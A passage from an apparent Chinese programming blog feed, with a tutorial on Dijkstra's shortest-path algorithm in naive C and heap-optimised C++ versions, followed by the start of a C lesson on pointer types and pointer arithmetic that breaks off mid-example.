A算法(基于动态规划,体现有BFS的思想)后可能会有更深刻的体会.</p><p>换句话说,主观上讲,贪心就是此算法的&quot;搜索依据&quot;.而BFS是SPFA的&quot;搜索依据&quot;.</p><h2 id="算法局限">算法局限</h2><p>Dijkstra算法不能有效处理带<code>负权</code>的图,这是因为一旦存在负权,那就有可能在后面通过一个次优点的一条负权的出边,缩短之前某一次<code>松弛</code>用的点<code>v</code>的<code>dis[v]</code>,使得路径之和进一步缩小,这就导致了错误.</p><p>举一个简单的例子:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231129023704021.png" alt="image-20231129023704021" style="zoom:50%;" /><p>访问到A时,选择最优点C(A-&gt;B为2,A-&gt;C为1,后者更短),将C标记,之后意味着C不能再被更新了.</p><p>但是显然,A-&gt;B-&gt;C这条路径计算出的A到C的路径长度为<code>0</code>,显然比原来的<code>1</code>更短,发生错误.</p><p>所以该算法在有负权边的图中无法使用.</p><h2 id="朴素写法时间复杂度">朴素写法时间复杂度</h2><p>之所以说<code>朴素写法</code>是因为该算法后续还有一个十分重要的<code>堆优化</code>可以大幅提高效率.</p><p>对于一个n个顶点,m条边的图:</p><p>显然,大循环要将所有的n个点进行访问一次,每次寻找最小dis的点需要一个O(n)的循环.另外还需要访问所有的边一遍(尽管是在大循环中,并且基于寻找的最小dis的点),需要O(m).</p><p>所以时间复杂度为<code>O(n^2+m)</code>,当n十分大,m相对较小时不占优势.</p><p>(但是鉴于此算法的贪心策略,后续可以有一种堆优化.)</p><h1 id="朴素写法">朴素写法</h1><p>前置知识:请先去学会<code>邻接表</code>或<code>链式前向星</code>.邻接矩阵在此算法中不占优势,特别是当图十分<code>稀疏</code>的时候更加明显.</p><p>本代码示例为纯C语言,采用<code>链式前向星</code>存图.<s>简单又高效,OIer的首选!好东西!</s></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 迪杰斯特拉算法-朴素写法-链式前向星存图</span></span><br><span class="line"><span class="comment">// 可移步洛谷P3371进行评测</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> to, dis, next;</span><br><span class="line">&#125; Edge; <span class="comment">// 边的存储结构,分别为终点,权值,下一条边的下标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="comment">// 链式前向星实际就是静态的邻接表</span></span><br><span class="line">    Edge *edge; <span class="comment">// 边表</span></span><br><span class="line">    <span class="type">int</span> *head; <span class="comment">// 记录起点的第一条出边下标的表</span></span><br><span class="line">    <span class="type">int</span> cnt; <span class="comment">// 构建链式前向星时记录边数(下标)</span></span><br><span class="line">    <span class="type">int</span> n, m; <span class="comment">// 点数,边数</span></span><br><span class="line">    <span class="type">int</span> start; <span class="comment">// 单源最短路起点,本代码没有封装一个算法结构体，所以这里直接用graph-&gt;start代替</span></span><br><span class="line">&#125; Graph;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_edge</span><span class="params">(Graph *graph, <span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> w)</span> &#123;</span><br><span class="line">    <span class="comment">// 构建链式前向星</span></span><br><span class="line">    graph-&gt;edge[++graph-&gt;cnt].to = to;</span><br><span class="line">    graph-&gt;edge[graph-&gt;cnt].dis = w;</span><br><span class="line">    graph-&gt;edge[graph-&gt;cnt].next = graph-&gt;head[from];</span><br><span class="line">    graph-&gt;head[from] = graph-&gt;cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_graph</span><span class="params">(Graph *graph)</span> &#123;</span><br><span class="line">    <span class="comment">// 输入n,m,start</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;graph-&gt;n, &amp;graph-&gt;m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;graph-&gt;start); <span class="comment">// 本代码没有封装一个算法结构体，所以这里直接用graph-&gt;start代替</span></span><br><span class="line"></span><br><span class="line">    graph-&gt;head = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line">    graph-&gt;edge = (Edge *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Edge) * (graph-&gt;m + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    graph-&gt;cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; i++)</span><br><span class="line">        graph-&gt;head[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输入m条边</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; graph-&gt;m; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> from, to, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;from, &amp;to, &amp;w);</span><br><span class="line">        add_edge(graph, from, to, w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *<span class="title function_">dijkstra</span><span class="params">(Graph *graph)</span> &#123;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> *vis = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line">    <span class="type">int</span> *dis = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; i++) &#123;</span><br><span class="line">        dis[i] = <span class="number">0x7FFFFFFF</span>; <span class="comment">// 此值为signed int类型能够存储的最大值,</span></span><br><span class="line">        <span class="comment">// 一般不容易达到,可以作为数学意义上的无穷大来使用,当然如果确实有达到这么大的值,</span></span><br><span class="line">        <span class="comment">// 可以使用 -1 加特判来替代</span></span><br><span class="line">        vis[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 输入起点</span></span><br><span class="line">    <span class="comment">// scanf(&quot;%d&quot;, &amp;start);</span></span><br><span class="line">    start = graph-&gt;start; <span class="comment">// 本代码没有封装一个算法结构体，所以这里直接用graph-&gt;start代替</span></span><br><span class="line">    dis[start] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 核心代码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; graph-&gt;n; ++j) &#123;</span><br><span class="line">        <span class="type">int</span> min = <span class="number">0x7FFFFFFF</span>, min_index = <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// 获取当前距起点最近的扩展点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[i] &lt; min &amp;&amp; !vis[i]) &#123;</span><br><span class="line">                min = dis[i];</span><br><span class="line">                min_index = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min_index == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">        vis[min_index] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 更新dis(松弛)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = graph-&gt;head[min_index]; i != <span class="number">0</span>; i = graph-&gt;edge[i].next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[graph-&gt;edge[i].to] &gt; dis[min_index] + graph-&gt;edge[i].dis)</span><br><span class="line">                dis[graph-&gt;edge[i].to] = dis[min_index] + graph-&gt;edge[i].dis;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(vis);</span><br><span class="line">    <span class="keyword">return</span> dis;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Graph graph;</span><br><span class="line">    init_graph(&amp;graph);</span><br><span class="line">    <span class="type">int</span> *dis = <span class="literal">NULL</span>;</span><br><span class="line">    dis = dijkstra(&amp;graph);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph.n; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, dis[i]);</span><br><span class="line">    <span class="built_in">free</span>(graph.head);</span><br><span class="line">    <span class="built_in">free</span>(graph.edge);</span><br><span class="line">    <span class="built_in">free</span>(dis);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码分析全在注释里了…</p><h1 id="二叉-堆优化写法">(二叉)堆优化写法</h1><p>本质上就是要优化那个贪心策略的内循环,寻找dis最小的点O(n)实在太慢了,通过构建一个<code>二叉堆(最小堆)</code>来优化.</p><p>通过堆优化可以将时间复杂度降低到<code>O((n+m)*log(n))</code>,具体分析略,掌握<code>二叉堆</code>的时间复杂度分析会有帮助.</p><p>本代码使用C++编写,二叉堆使用C++ STL的<code>priority_queue</code>来实现(实际上仍然是利用二叉堆优化).</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 同样可移步洛谷P3371进行测试</span></span><br><span class="line"><span class="comment">// 一个重要的解释:</span></span><br><span class="line"><span class="comment">// 优先队列不提供修改队内某元素优先级的的操作，</span></span><br><span class="line"><span class="comment">// 因此在得到某结点x的更小的dist后，更新dist[x]，</span></span><br><span class="line"><span class="comment">// 再直接再入队一个pair (new_dist,x) 就好。</span></span><br><span class="line"><span class="comment">// 因为new_dist比队列中结点x原先的dist要小，必定比原先那个“过时”的元素先出队</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 0x7FFFFFFF</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> cnt, n, m, s, head[<span class="number">100003</span>], dis[<span class="number">100003</span>];</span><br><span class="line"><span class="type">bool</span> vis[<span class="number">100003</span>];<span class="comment">//标记数组</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EDGE</span> &#123;</span></span><br><span class="line"><span class="type">int</span> to, dis, next;</span><br><span class="line">&#125; edge[<span class="number">500003</span>]; <span class="comment">//head和edge--&gt;链式前向星</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt; p;<span class="comment">//first为路径长度,second为点</span></span><br><span class="line"><span class="built_in">priority_queue</span>&lt;p, <span class="built_in">vector</span>&lt;p&gt;, greater&lt;p&gt; &gt; q;<span class="comment">//优先队列,从小到大---堆优化</span></span><br><span class="line"><span class="comment">//每当搜索到一个新点，扔到优先队列里面，这样每次就取队首的绝对是最优值--</span></span><br><span class="line"><span class="comment">//--&gt;省去内层循环</span></span><br><span class="line"><span class="comment">// 这里的堆根据pair的first来排序，所以每次取出的都是最小的first</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_edge</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> from;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; from;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; edge[++cnt].to;<span class="comment">//从1开始</span></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; edge[cnt].dis;</span><br><span class="line">edge[cnt].next = head[from];<span class="comment">//最初的0等同于NULL</span></span><br><span class="line">head[from] = cnt;<span class="comment">//from结点最新读取的一条出边作为遍历时访问的第一条边</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m &gt;&gt; s;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)</span><br><span class="line">add_edge();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) dis[i] = INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dijkstra</span><span class="params">()</span> &#123;</span><br><span class="line">dis[s] = <span class="number">0</span>;</span><br><span class="line">q.push(p(<span class="number">0</span>, s));</span><br><span class="line"><span class="keyword">while</span> (!q.empty()) &#123;</span><br><span class="line">p node = q.top(); q.pop();</span><br><span class="line"><span class="type">int</span> v = node.second;</span><br><span class="line"><span class="keyword">if</span> (vis[v])<span class="keyword">continue</span>;</span><br><span class="line">vis[v] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = head[v]; i; i = edge[i].next) &#123; <span class="comment">//终止条件为i==0即等同于NULL</span></span><br><span class="line"><span class="keyword">if</span> (dis[edge[i].to] &gt; edge[i].dis + node.first) &#123;</span><br><span class="line"><span class="comment">//node.first也可写为dis[v](?)</span></span><br><span class="line">dis[edge[i].to] = edge[i].dis + node.first;</span><br><span class="line">q.push(p(dis[edge[i].to], edge[i].to));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; dis[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">init();</span><br><span class="line">dijkstra();</span><br><span class="line">print();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思想上很简单,相当于使用前面说的<code>UnSet集合</code>构建一个二叉堆(最小堆),堆排序依据为堆中每个元素对应的顶点<code>i</code>的<code>dis[i]</code>大小,这样每次获取最小dis的点就是<code>O(1)</code>,并且从堆中pop这个点是<code>O(log(n))</code>.</p><p>二者结合起来,总的时间复杂度显然比原先整个遍历的<code>O(n)</code>要小得多,这样便有了效率提升.</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
            <tag> 最短路径 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-13_2-指针类型与指针运算</title>
      <link href="/2023270f21643ff7/"/>
      <url>/2023270f21643ff7/</url>
      
        <content type="html"><![CDATA[<p>前面<a href="../202310666f346238">13_1</a>章节中提到一个问题:<code>指针指向的数据类型的大小</code>.本章节围绕这个问题展开.</p><p>前置知识:</p><ol><li>指针变量的声明,赋值,与解引用操作</li><li>指向不同类型的指针如何声明</li></ol><h1 id="指针指向类型的大小">指针指向类型的大小</h1><p>前面提到,<code>指针的类型</code>即为<code>其指向的类型的指针</code>,声明语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[类型] *[指针变量名];</span><br></pre></td></tr></table></figure><p>C语言中任何值都有其类型,例如<code>int</code>,<code>float</code>,<code>char</code>等等.</p><p>同理,每一个指针变量/指针值也都有固定的类型,例如<code>int *</code>,<code>char *</code>,<code>float *</code>等,在这些基本类型的后面加一个<code>*</code>,整体即为一个特定的<code>指针类型</code>.</p><p>一个<code>指针变量</code>只能指向与其<code>指针类型</code>一致的变量.例如<code>int *</code>的指针变量只能指向int类型的变量,而不能指向char类型的变量.原因就是,对一个指针进行寻址(解引用),必须要确定数据大小,从指针值开始,取出固定的几个字节.</p><br><p>以前面<code>int i=2;</code>为例:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121004333759.png" alt="image-20231121004333759" style="zoom:50%;" /><p>假设i在内存中的地址为<code>0xFFFFFECC</code>,如图.我们知道int变量需要4个字节才能够存下,而实际上计算机内存的每个字节都有自己的地址,那么我们讲的&quot;i的地址&quot;,实际上是使用其最小字节的地址作为&quot;代表&quot;,也就是<code>0xFFFFFECC</code>,当我们需要访问i的时候,从这个字节开始,将连续的<code>4</code>个字节一起拿出来,作为一个整体来处理,也就是<code>02 00 00 00</code>.</p><p>以上操作的前提是,我们已知了int占用4字节,即<code>sizeof(int)==4</code>.使用指针进行访问也是如此,光知道了i的起始地址还不够,我们需要知道从这个指针值起始需要取出多少字节的数据.<code>指针类型</code>就提供了这样的信息.例如我们有<code>int *p;</code>想要获取一个指针指向类型的大小,可以这样:</p><p><code>int size = sizeof(*p);</code></p><p>由于sizeof后的表达式<code>不求值</code>,所以尽管没有对p初始化,我们也是可以写<code>sizeof(*p)</code>的,想想,p为<code>int*</code>,那么对p解引用自然就是<code>int</code>了,<code>sizeof int</code>就算出来<code>4</code>,即使用指针p进行解引用,要将4个字节作为一个整体去处理.同理,<code>char *p;</code>对p解引用时只处理1个字节,因为<code>sizeof(*p)</code>即为<code>sizeof(char)</code>,结果为<code>1</code>.</p><p>也就是说,我们可以确定一个指针所指向的类型占用的字节数,根据这个值在<code>解引用</code>时取出特定长度的一段内存数据.</p><h1 id="指针运算">指针运算</h1><p>指针本质上就是一个有类型的内存地址,其实就是一个特定长度的无符号整数,所谓的<code>指针类型</code>是这个整数的特殊解释方式.</p><p>作为一个数值,指针也支持一些运算,但是由于其并不是一般的整数,他的运算较为特殊.</p><p>指针仅支持<code>整数加减法</code>,而且两个指针间只能做<code>减法</code>,因为其他的运算没有任何意义.另外,指针运算往往离不开数组.</p><h2 id="指针加法">指针加法</h2><p>一个指针(地址)加1,即将地址加1,代表着这个指针指向下一个内存单元,即紧挨着原来那个字节再往后一个位置的字节.同理,一个指针加n,代表着这个指针指向原来的地址往后n个字节的地址.</p><p>例如有一个指向char类型的指针p,初始化为<code>0x1</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231211000827380.png" alt="image-20231211000827380" style="zoom:50%;" /><p>我们对p加上某个整数n,结果就是指向往后面数n个字节的那个内存地址.</p><br><p>现在问题来了,如果是<code>int *p=(int*)0x1;</code>呢?</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231211002229945.png" alt="image-20231211002229945" style="zoom:50%;" /><p>显然,<code>p+1</code>不再是指向紧挨着p之后的那个字节,而是向后<code>偏移</code>了整整4个字节,到达了<code>0x5</code>的位置.</p><br><p>这个问题其实很简单,我们在对指针进行解引用的时候,需要计算对应类型(即这个指针指向的类型)的大小,然后一次性取出特定长度的数据.对应地,我们将指针加上某个数,就是想要指向后面对应的数据,彼此之间应该是不能冲突的.</p><p>因此,我们需要做一个乘法,即:</p><p><code>(p+1)</code>等价于<code>(p)+sizeof(*p)*i</code> 其中,前者是C语言表达式,而后者是普通的数学算式!</p><p>对于<code>int *p</code>,其指向的类型<code>int</code>占用4个字节(只考虑32位以上的机器),那么在计算<code>p+1</code>的时候,要先将1乘以4,然后再和p的值进行相加,得到的就是0x1+1*4,即0x5.同理,<code>p+2</code>得到的就是0x1+2*4,即0x9.</p><p>而对于char *p,其指向的类型<code>char</code>只占用1个字节而已,所以加1仅仅是向后偏移1而已.</p><p>注:好好体会<code>偏移</code>这个词,后面会经常遇到.</p><br><p>另一方面,虽然标题写的是<code>指针加法</code>,但是两个指针进行相加是没有任何意义的…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a,b;</span><br><span class="line"><span class="type">int</span> *p1=&amp;a,*p2=&amp;b;</span><br><span class="line"><span class="comment">//int *p3=p1+p2; // 很容易理解,p3没有任何意义!因此实际上这行代码会报错</span></span><br></pre></td></tr></table></figure><h2 id="指针减法">指针减法</h2><p>一个指针减去一个常数和指针加一个常数的意义是一样的,只不过这回是向前(更低的地址)偏移了而已,这里就不举例了.</p><p>另一方面,与两个指针相加不同,两个指针相减是合法的,而且作用很大!</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231211005128076.png" alt="image-20231211005128076" style="zoom:50%;" /><p>这里,p2指向p1的下一个位置(相差1个int的长度),那么<code>(p2-p1)</code>的结果是这两个指针之间间隔的元素个数.</p><p>也许加一个数组进来会更加直观:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> *p1 = &amp;a[<span class="number">0</span>], *p2 = &amp;a[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p %p\n&quot;</span>, p2, p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, p2 - p1); <span class="comment">// 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果是3,代表着二者之间相差3个int变量,从数组下标也能看出来.</p><p>也就是说,指针与指针的相减操作,表示两个指针指向的内存位置之间相隔多少个元素(而不是字节数),因此指针相减往往与数组结合使用.</p><p>另外,必须提出的一点是,这两个指针必须指向同一个数组的某两个元素,否则<code>行为未定义</code>.</p><h2 id="指针自增">指针自增</h2><p>C语言中,<code>++</code>和<code>--</code>运算符是可以用于指针变量的,和普通变量一样,对指针自增或自减都是让这个指针变量的值&quot;加一&quot;或&quot;减一&quot;.</p><p>需要注意的区别是,其效果和<code>指针加法</code>,<code>指针减法</code>相同,都是向前向后<code>偏移</code>一个元素大小的长度,而不是1个字节的大小.</p><p>对指针变量自增/自减会修改指针变量的值,也就是修改这个指针的指向.这种写法有着十分重要的作用,例如达到只使用一个指针进行遍历的效果.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> *p = &amp;a[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 以下3种写法等价</span></span><br><span class="line">p++;</span><br><span class="line">p = p + <span class="number">1</span>;</span><br><span class="line">++p;</span><br></pre></td></tr></table></figure><p>同样需要注意的是,<code>前缀++</code>和<code>后缀++</code>的区别依然不变,如果不清楚的话请回看&quot;运算符&quot;这一部分.我们举一个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">int</span> *p, *q; <span class="comment">// 2个指针变量</span></span><br><span class="line">    p = q = &amp;a[<span class="number">0</span>]; <span class="comment">// 都指向数组的第一个元素</span></span><br><span class="line">    <span class="type">int</span> *i = p++; <span class="comment">// 后缀++，i指向a[0],即p的旧值，p指向a[1]</span></span><br><span class="line">    <span class="type">int</span> *j = ++q; <span class="comment">// 前缀++，j指向a[1],即q的新值，q指向a[1]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>, *i, *j, *p, *q); <span class="comment">// 0 1 1 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 